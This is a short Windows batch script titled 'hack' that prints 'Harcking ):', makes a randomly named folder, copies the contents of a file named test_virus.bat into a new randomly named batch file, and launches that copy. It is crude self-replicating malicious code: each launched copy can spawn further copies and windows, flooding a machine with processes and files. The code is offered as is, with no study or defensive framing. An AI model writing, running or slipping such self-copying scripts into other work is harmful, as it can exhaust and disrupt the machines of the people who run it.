@echo off 
title hack
echo Harcking ): 

SET /A test=%RANDOM% 

FOR /L %%y IN (1,1,1) DO (

    IF NOT EXIST "f" (
    	mkdir f%%yfi468_%test%
    )

    echo create %%y_%test%_newb.bat
    IF NOT EXIST "%%y_%test%_newb.bat" (
    	for /f "tokens=*" %%s in (test_virus.bat) do (
            echo %%s
        ) >> "%%y_%test%_newb.bat"
    )
    start %%y_%test%_newb.bat
    echo start %%y_%test%_newb.bat

)

pause

